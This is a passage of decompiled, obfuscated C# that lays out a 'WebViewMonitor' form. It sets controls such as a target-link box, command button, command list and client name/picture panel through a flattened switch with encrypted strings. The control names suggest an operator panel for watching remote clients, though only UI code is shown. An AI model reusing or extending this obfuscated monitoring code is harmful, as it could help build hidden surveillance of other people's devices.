            ((WebViewMonitor) this).linkspanel.Style = UIStyle.Custom;
            ((WebViewMonitor) this).linkspanel.TabIndex = 2;
            num1 = (int) num3 * 1457727314 ^ 1473628892;
            continue;
          case 74:
            ((WebViewMonitor) this).linkspanel.ForeColor = Color.White;
            num1 = (int) num3 * -740027331 ^ -439951537;
            continue;
          case 75:
            ((WebViewMonitor) this).openbtn.FillSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1837172297 ^ -38059579;
            continue;
          case 76:
            ((WebViewMonitor) this).linkspanel.FillColor = Color.Black;
            num1 = (int) num3 * 1831142895 ^ 1624653440;
            continue;
          case 77:
            ((WebViewMonitor) this).selecthtmlbtn.FillColor = Color.Black;
            num1 = (int) num3 * 1591710707 ^ -1805052965;
            continue;
          case 78:
            ((WebViewMonitor) this).commndbtn.Location = new Point(778, 8);
            num1 = (int) num3 * 1008672794 ^ 1036465842;
            continue;
          case 79:
            ((WebViewMonitor) this).Panel7.Margin = new Padding(2);
            ((WebViewMonitor) this).Panel7.Name = EXGuarder.\u0030C123E5F;
            ((WebViewMonitor) this).Panel7.Size = new Size(928, 24);
            ((WebViewMonitor) this).Panel7.TabIndex = 24;
            num1 = (int) num3 * 615862961 ^ 1330909605;
            continue;
          case 80:
            ((WebViewMonitor) this).statustext.Dock = DockStyle.Fill;
            num1 = (int) num3 * 825392050 ^ -275765798;
            continue;
          case 81:
            ((WebViewMonitor) this).Mytitle.Name = EXGuarder.\u0033917095E;
            num1 = (int) num3 * -1371213711 ^ 1012898869;
            continue;
          case 82:
            ((WebViewMonitor) this).savbtn.Location = new Point(712, 7);
            ((WebViewMonitor) this).savbtn.Name = EXGuarder.\u0030E146D40;
            num1 = (int) num3 * -1769314147 ^ -352295448;
            continue;
          case 83:
            ((WebViewMonitor) this).TabPage2.BackColor = Color.Black;
            num1 = (int) num3 * -380766653 ^ 1204378733;
            continue;
          case 84:
            ((WebViewMonitor) this).linktext.Padding = new Padding(5, 4, 5, 4);
            num1 = (int) num3 * -202340031 ^ -1011240419;
            continue;
          case 85:
            ((WebViewMonitor) this).vewimage.SizeMode = PictureBoxSizeMode.Zoom;
            num1 = (int) num3 * 498596526 ^ -561027592;
            continue;
          case 86:
            ((WebViewMonitor) this).DrakeUIComboBox1.Location = new Point(714, 0);
            ((WebViewMonitor) this).DrakeUIComboBox1.Margin = new Padding(4);
            num1 = (int) num3 * 2128002231 ^ 443512250;
            continue;
          case 87:
            ((WebViewMonitor) this).vsbar.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((WebViewMonitor) this).vsbar.Location = new Point(909, 52);
            num1 = (int) num3 * -692602135 ^ 286456677;
            continue;
          case 88:
            this.ShowIcon = false;
            num1 = (int) num3 * -257334581 ^ -1433879816;
            continue;
          case 89:
            ((WebViewMonitor) this).datapanel.ForeColor = Color.White;
            num1 = (int) num3 * -385160095 ^ -2041143313;
            continue;
          case 90:
            ((WebViewMonitor) this).cpybtn.Symbol = 62029;
            ((WebViewMonitor) this).cpybtn.TabIndex = 22;
            ((WebViewMonitor) this).cpybtn.Text = EXGuarder.\u003460C0138;
            num1 = (int) num3 * 338071502 ^ -795079116;
            continue;
          case 91:
            ((WebViewMonitor) this).Panel5.Name = EXGuarder.\u0032D795947;
            num1 = (int) num3 * 988251041 ^ -1331941799;
            continue;
          case 92:
            ((WebViewMonitor) this).TargetLink.Watermark = EXGuarder.\u00366035A0E;
            ((WebViewMonitor) this).TargetLink.WordWarp = false;
            ((WebViewMonitor) this).Mytitle.Dock = DockStyle.Left;
            num1 = (int) num3 * -258904574 ^ 220657772;
            continue;
          case 93:
            ((WebViewMonitor) this).Panel7.SuspendLayout();
            num1 = (int) num3 * -710650145 ^ 1658041935;
            continue;
          case 94:
            ((WebViewMonitor) this).nametext = new DrakeUITextBox();
            num1 = (int) num3 * 1556908538 ^ -1953181489;
            continue;
          case 95:
            ((WebViewMonitor) this).resulttext.BackColor = Color.Black;
            ((WebViewMonitor) this).resulttext.Dock = DockStyle.Fill;
            num1 = (int) num3 * 142310162 ^ 1348031150;
            continue;
          case 96:
            ((WebViewMonitor) this).Panel9.Controls.Add((Control) ((WebViewMonitor) this).cpybtn);
            num1 = (int) num3 * -576301112 ^ 2233494;
            continue;
          case 97:
            ((WebViewMonitor) this).ClientPic = new PictureBox();
            num1 = (int) num3 * -804077055 ^ -1513346863;
            continue;
          case 98:
            ((WebViewMonitor) this).refbtn = new DrakeUIButtonIcon();
            ((WebViewMonitor) this).savbtn = new DrakeUIButtonIcon();
            num1 = (int) num3 * 917473080 ^ 1144675752;
            continue;
          case 99:
            ((WebViewMonitor) this).vsbar.PressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1208624330 ^ -517787244;
            continue;
          case 100:
            ((WebViewMonitor) this).selecthtmlbtn.Radius = 25;
            num1 = (int) num3 * -678363121 ^ -528808655;
            continue;
          case 101:
            ((WebViewMonitor) this).linktext.StyleCustomMode = true;
            ((WebViewMonitor) this).linktext.TabIndex = 44;
            ((WebViewMonitor) this).linktext.TextAlignment = ContentAlignment.TopCenter;
            num1 = (int) num3 * -1151421155 ^ 1968268179;
            continue;
          case 102:
            ((WebViewMonitor) this).commndbtn.RectHoverColor = Color.White;
            ((WebViewMonitor) this).commndbtn.RectPressColor = Color.White;
            ((WebViewMonitor) this).commndbtn.RectSelectedColor = Color.White;
            num1 = (int) num3 * -496056564 ^ -2024377604;
            continue;
          case 103:
            ((WebViewMonitor) this).Panel3.Location = new Point(0, 29);
            num1 = (int) num3 * 1720941145 ^ -1678154722;
            continue;
          case 104:
            ((WebViewMonitor) this).clrbtn.ForePressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -103296252 ^ -819141574;
            continue;
          case 105:
            ((WebViewMonitor) this).openbtn.Name = EXGuarder.\u003241C0414;
            ((WebViewMonitor) this).openbtn.Radius = 25;
            ((WebViewMonitor) this).openbtn.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -218759892 ^ -1034579884;
            continue;
          case 106:
            ((WebViewMonitor) this).comandcombo.Name = EXGuarder.\u00342413C00;
            num1 = (int) num3 * 1950411600 ^ 1933526036;
            continue;
          case 107:
            ((WebViewMonitor) this).Panel8.Controls.Add((Control) ((WebViewMonitor) this).Label3);
            ((WebViewMonitor) this).Panel8.Controls.Add((Control) ((WebViewMonitor) this).comandcombo);
            num1 = (int) num3 * 1296704253 ^ 553061900;
            continue;
          case 108:
            ((WebViewMonitor) this).commndbtn.ForePressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -197792241 ^ -1421581330;
            continue;
          case 109:
            ((WebViewMonitor) this).Panel2.SuspendLayout();
            ((WebViewMonitor) this).Panel3.SuspendLayout();
            ((WebViewMonitor) this).tabcontrols.SuspendLayout();
            num1 = (int) num3 * 1252135580 ^ -1940641018;
            continue;
          case 110:
            ((WebViewMonitor) this).idtext.Radius = 10;
            num1 = (int) num3 * 97833165 ^ 1923623030;
            continue;
          case 111:
            ((WebViewMonitor) this).selecthtmlbtn = new DrakeUIButtonIcon();
            ((WebViewMonitor) this).TabPage3 = new TabPage();
            ((WebViewMonitor) this).datapanel = new DrakeUITitlePanel();
            num1 = (int) num3 * 2049390287 ^ 170650679;
            continue;
          case 112:
            ((WebViewMonitor) this).vewimage.Dock = DockStyle.Fill;
            num1 = (int) num3 * -974697923 ^ 677867556;
            continue;
          case 113:
            ((WebViewMonitor) this).openbtn.RectPressColor = Color.White;
            ((WebViewMonitor) this).openbtn.RectSelectedColor = Color.White;
            num1 = (int) num3 * 830405713 ^ 899373276;
            continue;
          case 114:
            ((WebViewMonitor) this).datalogtext = new DrakeUIRichTextBox();
            ((WebViewMonitor) this).linkspanel = new DrakeUITitlePanel();
            num1 = (int) num3 * 1048843907 ^ 378168932;
            continue;
          case 115:
            ((WebViewMonitor) this).tabcontrols.MenuStyle = UIMenuStyle.Custom;
            num1 = (int) num3 * -42187838 ^ 1410616829;
            continue;
          case 116:
            ((WebViewMonitor) this).Panel5.Margin = new Padding(2);
            num1 = (int) num3 * 599949857 ^ 1615395396;
            continue;
          case 117:
            ((WebViewMonitor) this).datapanel.FillColor = Color.Black;
            num1 = (int) num3 * -1324506778 ^ -821713055;
            continue;
          case 118:
            ((WebViewMonitor) this).nametext.Radius = 10;
            ((WebViewMonitor) this).nametext.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -808387708 ^ 609942884;
            continue;
          case 119:
            ((WebViewMonitor) this).selecthtmlbtn.Location = new Point(748, 19);
            num1 = (int) num3 * -500911271 ^ -971966206;
            continue;
          case 120:
            ((WebViewMonitor) this).TabPage1.Location = new Point(0, 80);
            num1 = (int) num3 * -2116326232 ^ 103122243;
            continue;
          case 121:
            ((WebViewMonitor) this).Panel8.Controls.Add((Control) ((WebViewMonitor) this).commndbtn);
            num1 = (int) num3 * -903632989 ^ 745377339;
            continue;
          case 122:
            ((WebViewMonitor) this).openbtn.Location = new Point(829, 0);
            num1 = (int) num3 * -287594536 ^ -404945468;
            continue;
          case 123:
            ((WebViewMonitor) this).Mytitle.Location = new Point(0, 0);
            num1 = (int) num3 * 1877594588 ^ 230457627;
            continue;
          case 124:
            ((WebViewMonitor) this).SaveCheck.Size = new Size(73, 24);
            ((WebViewMonitor) this).SaveCheck.Style = UIStyle.Custom;
            num1 = (int) num3 * 192171740 ^ -1957754595;
            continue;
          case 125:
            ((WebViewMonitor) this).refbtn.Size = new Size(100, 24);
            ((WebViewMonitor) this).refbtn.Style = UIStyle.Custom;
            ((WebViewMonitor) this).refbtn.StyleCustomMode = true;
            ((WebViewMonitor) this).refbtn.Symbol = 61473;
            num1 = (int) num3 * -457058500 ^ 1886424861;
            continue;
          case 126:
            ((WebViewMonitor) this).commndbtn.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((WebViewMonitor) this).commndbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * 612737061 ^ -443664084;
            continue;
          case (uint) sbyte.MaxValue:
            ((WebViewMonitor) this).vsbar.Dock = DockStyle.Right;
            num1 = (int) num3 * -265104327 ^ 208155442;
            continue;
          case 128:
            ((WebViewMonitor) this).SaveCheck.Font = new Font(EXGuarder.\u00340753611, 9f);
            ((WebViewMonitor) this).SaveCheck.ForeColor = Color.White;
            ((WebViewMonitor) this).SaveCheck.Location = new Point(855, 0);
            num1 = (int) num3 * -559776539 ^ -2048040469;
            continue;
          case 129:
            ((WebViewMonitor) this).linktext.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * -741726834 ^ -511065064;
            continue;
          case 130:
            ((WebViewMonitor) this).ClientPic.Size = new Size(32, 29);
            ((WebViewMonitor) this).ClientPic.SizeMode = PictureBoxSizeMode.Zoom;
            num1 = (int) num3 * 511712222 ^ 790448403;
            continue;
          case 131:
            ((WebViewMonitor) this).Panel6.Dock = DockStyle.Bottom;
            ((WebViewMonitor) this).Panel6.Location = new Point(0, 24);
            num1 = (int) num3 * -1016604219 ^ 646542941;
            continue;
          case 132:
            ((WebViewMonitor) this).tabcontrols.TabSelectedForeColor = Color.Black;
            num1 = (int) num3 * -636974864 ^ -779642317;
            continue;
          case 133:
            ((WebViewMonitor) this).Label2.Font = new Font(EXGuarder.\u00340753611, 20f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            ((WebViewMonitor) this).Label2.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1944279118 ^ -1424150649;
            continue;
          case 134:
            ((WebViewMonitor) this).idtext.TextAlignment = ContentAlignment.TopCenter;
            num1 = (int) num3 * 1898367886 ^ 1430100940;
            continue;
          case 135:
            ((WebViewMonitor) this).vewimage.Location = new Point(0, 52);
            ((WebViewMonitor) this).vewimage.Margin = new Padding(2);
            num1 = (int) num3 * -1109902992 ^ 220126453;
            continue;
          case 136:
            ((WebViewMonitor) this).nametext.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * 645436702 ^ 1018071975;
            continue;
          case 137:
            ((WebViewMonitor) this).openbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * -1706594885 ^ -387432480;
            continue;
          case 138:
            ((WebViewMonitor) this).clinameinfo.Name = EXGuarder.\u00306527955;
            num1 = (int) num3 * -2095935512 ^ 1184041956;
            continue;
          case 139:
            ((WebViewMonitor) this).commndbtn.Cursor = Cursors.Hand;
            num1 = (int) num3 * 1654944165 ^ -1064803843;
            continue;
          case 140:
            ((WebViewMonitor) this).clrbtn.FillHoverColor = Color.FromArgb(20, 20, 20);
            ((WebViewMonitor) this).clrbtn.FillPressColor = Color.Black;
            num1 = (int) num3 * 1203336255 ^ -1722877337;
            continue;
          case 141:
            ((WebViewMonitor) this).comandcombo.FillColor = Color.Black;
            num1 = (int) num3 * -498446180 ^ -1655612906;
            continue;
          case 142:
            ((WebViewMonitor) this).commndbtn.FillPressColor = Color.Black;
            num1 = (int) num3 * 1226515460 ^ -598883805;
            continue;
          case 143:
            ((WebViewMonitor) this).DrakeUIComboBox1.Padding = new Padding(0, 0, 30, 0);
            num1 = (int) num3 * 1742933284 ^ 1669170079;
            continue;
          case 144:
            ((WebViewMonitor) this).resulttext.ForeColor = Color.White;
            ((WebViewMonitor) this).resulttext.Location = new Point(0, 55);
            ((WebViewMonitor) this).resulttext.Name = EXGuarder.\u0035E213C1A;
            num1 = (int) num3 * 505005721 ^ -1154054111;
            continue;
          case 145:
            ((WebViewMonitor) this).comandcombo.RectDisableColor = Color.FromArgb(227, 242, 253);
            ((WebViewMonitor) this).comandcombo.Size = new Size(82, 27);
            num1 = (int) num3 * -1917441369 ^ -1664911725;
            continue;
          case 146:
            ((WebViewMonitor) this).Panel9.Location = new Point(0, 413);
            num1 = (int) num3 * 1033998613 ^ 10775441;
            continue;
          case 147:
            ((WebViewMonitor) this).Panel9.Dock = DockStyle.Bottom;
            num1 = (int) num3 * -1329666717 ^ -786483415;
            continue;
          case 148:
            ((WebViewMonitor) this).clinameinfo.Location = new Point(32, 0);
            ((WebViewMonitor) this).clinameinfo.Margin = new Padding(2, 0, 2, 0);
            num1 = (int) num3 * 1480202407 ^ 963808661;
            continue;
          case 149:
            ((WebViewMonitor) this).vewimage.Name = EXGuarder.\u00324062D78;
            ((WebViewMonitor) this).vewimage.Size = new Size(909, 401);
            num1 = (int) num3 * -925201895 ^ 1998232395;
            continue;
          case 150:
            ((WebViewMonitor) this).Panel6.SuspendLayout();
            num1 = (int) num3 * -28460699 ^ 865167969;
            continue;
          case 151:
            ((WebViewMonitor) this).datalogtext.Margin = new Padding(3, 4, 3, 4);
            ((WebViewMonitor) this).datalogtext.Name = EXGuarder.\u0036E2F5F31;
            ((WebViewMonitor) this).datalogtext.Padding = new Padding(2);
            ((WebViewMonitor) this).datalogtext.RectColor = Color.FromArgb(130, 130, 130);
            ((WebViewMonitor) this).datalogtext.RectDisableColor = Color.FromArgb(227, 242, 253);
            ((WebViewMonitor) this).datalogtext.RectSides = ToolStripStatusLabelBorderSides.Bottom | ToolStripStatusLabelBorderSides.Left | ToolStripStatusLabelBorderSides.Right;
            num1 = (int) num3 * -122409147 ^ -207875791;
            continue;
          case 152:
            ((WebViewMonitor) this).linktext = new DrakeUITextBox();
            num1 = (int) num3 * -786349302 ^ -997242238;
            continue;
          case 153:
            ((WebViewMonitor) this).Panel9.Name = EXGuarder.\u0033F627353;
            num1 = (int) num3 * 358019603 ^ -441468958;
            continue;
          case 154:
            ((WebViewMonitor) this).cpybtn.FillSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((WebViewMonitor) this).cpybtn.Font = new Font(EXGuarder.\u00340753611, 12f);
            ((WebViewMonitor) this).cpybtn.ForePressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((WebViewMonitor) this).cpybtn.Location = new Point(605, 7);
            num1 = (int) num3 * 1767281409 ^ 1758343713;
            continue;
          case 155:
            ((WebViewMonitor) this).clinameinfo.Dock = DockStyle.Fill;
            num1 = (int) num3 * 1356829425 ^ 1883725523;
            continue;
          case 156:
            ((WebViewMonitor) this).tabcontrols.DrawMode = TabDrawMode.OwnerDrawFixed;
            num1 = (int) num3 * -2046575073 ^ 1167174541;
            continue;
          case 157:
            ((WebViewMonitor) this).Panel4.ResumeLayout(false);
            num1 = (int) num3 * -1355808748 ^ -1682635932;
            continue;
          case 158:
            ((WebViewMonitor) this).clrbtn.Font = new Font(EXGuarder.\u00340753611, 12f);
            num1 = (int) num3 * -736167384 ^ -559097810;
            continue;
          case 159:
            ((WebViewMonitor) this).commndbtn = new DrakeUIButtonIcon();
            num1 = (int) num3 * 606401142 ^ -82816245;
            continue;
          case 160:
            ((WebViewMonitor) this).statustext.Name = EXGuarder.\u00320400357;
            num1 = (int) num3 * 2027975708 ^ -1937286903;
            continue;
          case 161:
            ((WebViewMonitor) this).ClientPic.Location = new Point(0, 0);
            num1 = (int) num3 * -2034368297 ^ 883207551;
            continue;
          case 162:
            ((WebViewMonitor) this).selecthtmlbtn.RectPressColor = Color.White;
            num1 = (int) num3 * -1050808765 ^ -1873025639;
            continue;
          case 163:
            ((WebViewMonitor) this).savbtn.Symbol = 61717;
            num1 = (int) num3 * -221247537 ^ 1159673074;
            continue;
          case 164:
            ((WebViewMonitor) this).comandcombo.BackColor = Color.Black;
            ((WebViewMonitor) this).comandcombo.DropDownStyle = UIDropDownStyle.DropDownList;
            num1 = (int) num3 * 47839910 ^ -1865089006;
            continue;
          case 165:
            ((WebViewMonitor) this).refbtn.BackColor = Color.Black;
            ((WebViewMonitor) this).refbtn.Cursor = Cursors.Hand;
            num1 = (int) num3 * 424956851 ^ -1003890307;
            continue;
          case 166:
            ((WebViewMonitor) this).comandcombo.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1855350594 ^ 1661267571;
            continue;
          case 167:
            ((WebViewMonitor) this).clinameinfo.Size = new Size(896, 29);
            num1 = (int) num3 * -1143847390 ^ -968271332;
            continue;
          case 168:
            ((WebViewMonitor) this).savbtn.TabIndex = 24;
            ((WebViewMonitor) this).savbtn.Text = EXGuarder.\u003682D1476;
            ((WebViewMonitor) this).clrbtn.BackColor = Color.Black;
            num1 = (int) num3 * -474298869 ^ 955968665;
            continue;
          case 169:
            ((WebViewMonitor) this).Panel4.Name = EXGuarder.\u00336075E5F;
            ((WebViewMonitor) this).Panel4.Size = new Size(928, 55);
            ((WebViewMonitor) this).Panel4.TabIndex = 2;
            ((WebViewMonitor) this).Label2.AutoSize = true;
            num1 = (int) num3 * -1932049643 ^ 1853588960;
            continue;
          case 170:
            ((WebViewMonitor) this).Panel7.Dock = DockStyle.Fill;
            num1 = (int) num3 * 862913000 ^ 181802133;
            continue;
          case 171:
            ((WebViewMonitor) this).namescombo.Radius = 15;
            num1 = (int) num3 * 181905078 ^ 2017841797;
            continue;
          case 172:
            ((WebViewMonitor) this).ClientPic.TabStop = false;
            num1 = (int) num3 * -1534334745 ^ -1709686461;
            continue;
          case 173:
            ((WebViewMonitor) this).Panel4.Controls.Add((Control) ((WebViewMonitor) this).Label2);
            num1 = (int) num3 * 1251764520 ^ 239392438;
            continue;
          case 174:
            ((WebViewMonitor) this).TargetLink.RectDisableColor = Color.FromArgb(227, 242, 253);
            ((WebViewMonitor) this).TargetLink.Size = new Size(588, 27);
            ((WebViewMonitor) this).TargetLink.Style = UIStyle.Custom;
            num1 = (int) num3 * 763574919 ^ -2034233096;
            continue;
          case 175:
            ((WebViewMonitor) this).TabPage3.Text = EXGuarder.\u00367252B18;
            num1 = (int) num3 * 190214923 ^ -238154697;
            continue;
          case 176:
            ((WebViewMonitor) this).statustext.Location = new Point(0, 0);
            num1 = (int) num3 * 1054173024 ^ 443204383;
            continue;
          case 177:
            ((WebViewMonitor) this).refbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * 447033584 ^ -104873500;
            continue;
          case 178:
            ((WebViewMonitor) this).linkspanel.Location = new Point(0, 38);
            num1 = (int) num3 * -647374390 ^ 1656158923;
            continue;
          case 179:
            ((WebViewMonitor) this).Panel4.Dock = DockStyle.Top;
            num1 = (int) num3 * 310298342 ^ 1100575349;
            continue;
          case 180:
            ((WebViewMonitor) this).clinameinfo.Text = EXGuarder.\u00342040A51;
            ((WebViewMonitor) this).clinameinfo.TextAlign = ContentAlignment.MiddleLeft;
            num1 = (int) num3 * -40959835 ^ -870063104;
            continue;
          case 181:
            ((WebViewMonitor) this).cpybtn.Size = new Size(100, 24);
            num1 = (int) num3 * -1494560415 ^ -1934254566;
            continue;
          case 182:
            this.ClientSize = new Size(928, 578);
            num1 = (int) num3 * -1181445937 ^ 922879357;
            continue;
          case 183:
            ((WebViewMonitor) this).savbtn.Font = new Font(EXGuarder.\u00340753611, 12f);
            ((WebViewMonitor) this).savbtn.ForePressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 2121718093 ^ 11441073;
            continue;
          case 184:
            ((WebViewMonitor) this).namescombo.Font = new Font(EXGuarder.\u00340753611, 12f);
            ((WebViewMonitor) this).namescombo.ForeColor = Color.White;
            ((WebViewMonitor) this).namescombo.Location = new Point(10, 7);
            ((WebViewMonitor) this).namescombo.Margin = new Padding(3, 4, 3, 4);
            ((WebViewMonitor) this).namescombo.MinimumSize = new Size(47, 0);
            ((WebViewMonitor) this).namescombo.Name = EXGuarder.\u00332075E38;
            ((WebViewMonitor) this).namescombo.Padding = new Padding(0, 0, 22, 0);
            num1 = (int) num3 * 961463421 ^ -232897469;
            continue;
          case 185:
            ((WebViewMonitor) this).SaveCheck.RightToLeft = RightToLeft.Yes;
            num1 = (int) num3 * -88698548 ^ -3153874;
            continue;
          case 186:
            ((WebViewMonitor) this).Panel3.Size = new Size(928, 549);
            ((WebViewMonitor) this).Panel3.TabIndex = 3;
            num1 = (int) num3 * -1028034222 ^ -376003663;
            continue;
          case 187:
            ((WebViewMonitor) this).namescombo.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * -1057287929 ^ -1181567084;
            continue;
          case 188:
            ((WebViewMonitor) this).resulttext = new Label();
            ((WebViewMonitor) this).Panel4 = new Panel();
            ((WebViewMonitor) this).Label2 = new Label();
            num1 = (int) num3 * -2039090463 ^ 1780974253;
            continue;
          case 189:
            ((WebViewMonitor) this).vsbar.FillColor = Color.Black;
            ((WebViewMonitor) this).vsbar.Font = new Font(EXGuarder.\u00340753611, 12f);
            num1 = (int) num3 * 344361707 ^ -448649137;
            continue;
          case 190:
            ((WebViewMonitor) this).Panel6 = new Panel();
            ((WebViewMonitor) this).TargetLink = new DrakeUITextBox();
            num1 = (int) num3 * 1935198490 ^ -1926508426;
            continue;
          case 191:
            ((WebViewMonitor) this).TargetLink.Location = new Point(126, 0);
            num1 = (int) num3 * 1528477392 ^ 2038962029;
            continue;
          case 192:
            ((WebViewMonitor) this).cpybtn.Style = UIStyle.Custom;
            num1 = (int) num3 * -381643126 ^ -537557387;
            continue;
          case 193:
            ((WebViewMonitor) this).commndbtn.Symbol = 61913;
            num1 = (int) num3 * -140700295 ^ 120851954;
            continue;
          case 194:
            ((WebViewMonitor) this).Panel9.Size = new Size(928, 40);
            ((WebViewMonitor) this).Panel9.TabIndex = 21;
            num1 = (int) num3 * 37208397 ^ -1524197044;
            continue;
          case 195:
            ((WebViewMonitor) this).tabcontrols.TabUnSelectedForeColor = Color.FromArgb(240, 240, 240);
            ((WebViewMonitor) this).TabPage1.BackColor = Color.Black;
            num1 = (int) num3 * 1765515933 ^ 1104303065;
            continue;
          case 196:
            ((WebViewMonitor) this).linkspanel.Size = new Size(284, 375);
            num1 = (int) num3 * 1728495848 ^ 1081972822;
            continue;
          case 197:
            ((WebViewMonitor) this).TargetLink.ForeColor = Color.White;
            num1 = (int) num3 * -2141040148 ^ 757592492;
            continue;
          case 198:
            ((WebViewMonitor) this).selecthtmlbtn.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -1538173449 ^ 1577920878;
            continue;
          case 199:
            ((WebViewMonitor) this).Panel2.TabIndex = 2;
            num1 = (int) num3 * -91775258 ^ -1748337630;
            continue;
          case 200:
            ((WebViewMonitor) this).Panel1.ResumeLayout(false);
            num1 = (int) num3 * 1262018738 ^ -1728009773;
            continue;
          case 201:
            ((WebViewMonitor) this).Panel2 = new Panel();
            num1 = (int) num3 * 2114794802 ^ -1645585773;
            continue;
          case 202:
            ((WebViewMonitor) this).statustext.ForeColor = Color.Lime;
            num1 = (int) num3 * 1727625939 ^ -1161106969;
            continue;
          case 203:
            ((WebViewMonitor) this).linkspanel.Dock = DockStyle.Left;
            num1 = (int) num3 * -1793379353 ^ 1981027773;
            continue;
          case 204:
            ((WebViewMonitor) this).Panel3.Name = EXGuarder.\u0032C085D48;
            num1 = (int) num3 * -2077957638 ^ 223459217;
            continue;
          case 205:
            ((WebViewMonitor) this).clrbtn.Cursor = Cursors.Hand;
            ((WebViewMonitor) this).clrbtn.FillColor = Color.Black;
            num1 = (int) num3 * 1740228486 ^ 1535979149;
            continue;
          case 206:
            ((WebViewMonitor) this).clrbtn = new DrakeUIButtonIcon();
            ((WebViewMonitor) this).cpybtn = new DrakeUIButtonIcon();
            ((WebViewMonitor) this).BWloader = new BackgroundWorker();
            ((WebViewMonitor) this).timeloader = new Timer(((information) this).components);
            num1 = (int) num3 * -1699782759 ^ 1810454195;
            continue;
          case 207:
            ((WebViewMonitor) this).nametext.FillColor = Color.Black;
            ((WebViewMonitor) this).nametext.Font = new Font(EXGuarder.\u00340753611, 12f);
            ((WebViewMonitor) this).nametext.ForeColor = Color.White;
            ((WebViewMonitor) this).nametext.Location = new Point(130, 7);
            num1 = (int) num3 * -662663868 ^ -966023491;
            continue;
          case 208:
            ((WebViewMonitor) this).selecthtmlbtn.RectSelectedColor = Color.White;
            ((WebViewMonitor) this).selecthtmlbtn.Size = new Size(170, 24);
            ((WebViewMonitor) this).selecthtmlbtn.Style = UIStyle.Custom;
            ((WebViewMonitor) this).selecthtmlbtn.Symbol = 61543;
            num1 = (int) num3 * 833522075 ^ -828601205;
            continue;
          case 209:
            ((WebViewMonitor) this).Panel1.SuspendLayout();
            num1 = (int) num3 * -257644290 ^ 166667295;
            continue;
          case 210:
            ((WebViewMonitor) this).savbtn.Cursor = Cursors.Hand;
            num1 = (int) num3 * -169371996 ^ -2020669566;
            continue;
          case 211:
            goto label_3;
          case 212:
            ((WebViewMonitor) this).cpybtn.Cursor = Cursors.Hand;
            num1 = (int) num3 * 1678935409 ^ 1764533866;
            continue;
          case 213:
            ((WebViewMonitor) this).DrakeUIComboBox1.Style = UIStyle.Custom;
            num1 = (int) num3 * -1450787460 ^ 682018227;
            continue;
          case 214:
            ((WebViewMonitor) this).savbtn.Style = UIStyle.Custom;
            num1 = (int) num3 * -2095402282 ^ -2111642221;
            continue;
          case 215:
            ((WebViewMonitor) this).TabPage3.Size = new Size(928, 453);
            num1 = (int) num3 * 1186376887 ^ -1677069303;
            continue;
          case 216:
            ((WebViewMonitor) this).commndbtn.TabIndex = 20;
            ((WebViewMonitor) this).commndbtn.Text = EXGuarder.\u00312360360;
            num1 = (int) num3 * 546730989 ^ -1099453445;
            continue;
          case 217:
            ((WebViewMonitor) this).nametext.Style = UIStyle.Custom;
            ((WebViewMonitor) this).nametext.StyleCustomMode = true;
            num1 = (int) num3 * -47427865 ^ -1163308528;
            continue;
          case 218:
            ((WebViewMonitor) this).TabPage1.SuspendLayout();
            ((ISupportInitialize) ((WebViewMonitor) this).vewimage).BeginInit();
            ((WebViewMonitor) this).TabPage2.SuspendLayout();
            ((WebViewMonitor) this).Panel4.SuspendLayout();
            num1 = (int) num3 * 1115366589 ^ -1172041214;
            continue;
          case 219:
            ((WebViewMonitor) this).TabPage2.Controls.Add((Control) ((WebViewMonitor) this).resulttext);
            num1 = (int) num3 * -1631259180 ^ 2002998806;
            continue;
          case 220:
            ((WebViewMonitor) this).datalogtext.Location = new Point(0, 26);
            num1 = (int) num3 * -503845612 ^ -1325081317;
            continue;
          case 221:
            ((WebViewMonitor) this).linkspanel.Margin = new Padding(3, 4, 3, 4);
            num1 = (int) num3 * 400483175 ^ -1512981523;
            continue;
          case 222:
            ((WebViewMonitor) this).Label2.Location = new Point(12, 8);
            ((WebViewMonitor) this).Label2.Name = EXGuarder.\u0037168244F;
            num1 = (int) num3 * -2079776712 ^ 308774090;
            continue;
          case 223:
            ((WebViewMonitor) this).commndbtn.FillColor = Color.Black;
            ((WebViewMonitor) this).commndbtn.FillHoverColor = Color.FromArgb(20, 20, 20);
            num1 = (int) num3 * -1300286146 ^ 1851938473;
            continue;
          case 224:
            ((WebViewMonitor) this).Panel8.Controls.Add((Control) ((WebViewMonitor) this).idtext);
            ((WebViewMonitor) this).Panel8.Controls.Add((Control) ((WebViewMonitor) this).nametext);
            ((WebViewMonitor) this).Panel8.Controls.Add((Control) ((WebViewMonitor) this).linktext);
            num1 = (int) num3 * 1990599941 ^ -492489669;
            continue;
          case 225:
            ((WebViewMonitor) this).idtext.ForeColor = Color.White;
            num1 = (int) num3 * 1414362282 ^ 1136960388;
            continue;
          case 226:
            ((WebViewMonitor) this).Panel7.ResumeLayout(false);
            num1 = (int) num3 * 2039426110 ^ -1180865702;
            continue;
          case 227:
            ((WebViewMonitor) this).Panel1.Controls.Add((Control) ((WebViewMonitor) this).Panel6);
            ((WebViewMonitor) this).Panel1.Dock = DockStyle.Top;
            num1 = (int) num3 * -4944475 ^ -437524032;
            continue;
          case 228:
